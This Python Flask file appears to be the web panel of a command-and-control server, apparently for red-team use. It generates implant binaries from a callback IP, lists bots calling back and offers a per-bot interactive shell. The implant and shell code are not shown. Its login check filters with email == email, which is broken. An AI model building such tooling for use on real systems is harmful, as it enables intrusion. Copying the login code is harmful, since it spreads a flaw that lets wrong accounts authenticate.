from flask import render_template, redirect, url_for, request, session, flash
from flask_wtf import FlaskForm
from functools import wraps
from wtforms.fields.numeric import IntegerField

from wtforms.fields.simple import PasswordField
from wtforms import StringField
from werkzeug.security import check_password_hash, generate_password_hash
import helper
import constants
import models


def login_required(f):
    """Requires a user to login before they can access critical endpoints

    :returns: redirects an unauthenticated user to /login
    :rtype: wrap
    """
    @wraps(f)
    def wrap(*args, **kwargs):
        if 'logged_in' in session:
            return f(*args, **kwargs)
        else:
            flash('You need to login first.')
            return redirect(url_for('login'))

    return wrap


class MyForm(FlaskForm):
    """Form used to configure the main implant

    :param ip: The callback IP address
    :type ip: str
    :param sleep: The amount of the time the implant should wait to callback
    :type sleep: str
    :returns: none
    :rtype: None
    """
    ip = StringField('IP')
    sleep = IntegerField('Sleep Time')


class AuthForm(FlaskForm):
    """Form used to register a user

    """
    email = StringField('name')
    name = StringField('name')
    password = PasswordField('password')


@constants.app.route('/config', methods=['GET', 'POST'])
@login_required
def generate():
    """Endpoint that contains a form allowing the user to provide values
    for a custom config and generate a new implant binary

    """
    form = MyForm()
    if request.method == 'POST':
        args = [request.form[key] for key in request.form.keys()
                if request.form[key] != '']
        print(args)
        helper.build_implant(*args)
        print("Payload Successfuly Generated!")
    return render_template("config.html", form=form)


@constants.app.route('/bot<id>', methods=['GET'])
@login_required
def bot(id):
    """Endpoint that displays all the information regarding the
    bot with the specified ID, and includes an interactive shell.

    :param id: The ID of the agent
    :type id: str
    """
    agent = models.Agent.query.filter_by(id=id).first()
    print(agent)
    return render_template("bot.html", agent=agent)


@constants.app.route('/', methods=['GET'])
@login_required
def home():
    """Endpoint that displays a pwnboard that includes all of the
    active implants calling back to the server

    """
    helper.check_agent_alive()
    agents = models.db.session.query(models.Agent).all()
    return render_template('index.html', agents=agents)


@constants.app.route('/welcome', methods=['GET'])
def welcome():
    return render_template("welcome.html")


@constants.app.route('/login', methods=['GET', 'POST'])
def login():
    """Endpoint that allows a user to login and authenticate
    themselves with the server

    """
    error = None
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        user = models.User.query.filter(email == email).first()
        if not user:
            error = "Account not found"
        elif not check_password_hash(user.password, password):
            error = "Invalid credentials. Please try again."
        else:
            session['logged_in'] = True
            flash('You were just logged in!')
            return redirect(url_for('welcome'))
    return render_template('login.html', error=error)


@constants.app.route('/logout', methods=['GET'])
@login_required
def logout():
    """Endpoint that allows a user to logout of their session

    """
    session.pop('logged_in', None)
    flash('You were just logged out!')
    return redirect(url_for('welcome'))


@constants.app.route('/signup', methods=['GET', 'POST'])
def signup():
    """Endpoint that allows a user to register an account

    """
    form = AuthForm()

    if request.method == 'POST':
        email = request.form['email']
        name = request.form['name']
        password = request.form['password']

        user = models.User.query.filter_by(email=email).first()

        if user:
            return "BINGUS: ALREADY REGISTERED"

        new_user = models.User(email=email, name=name, password=generate_password_hash
                                  (password, method='sha256'))

        models.db.session.add(new_user)
        models.db.session.commit()
        return redirect(url_for('login'))

    return render_template('signup.html', form=form)


if __name__ == '__main__':
    """Runs the base flask app, only use for debugging,
    otherwise use the preferred method in README.md

    """
    constants.app.run(host="0.0.0.0")
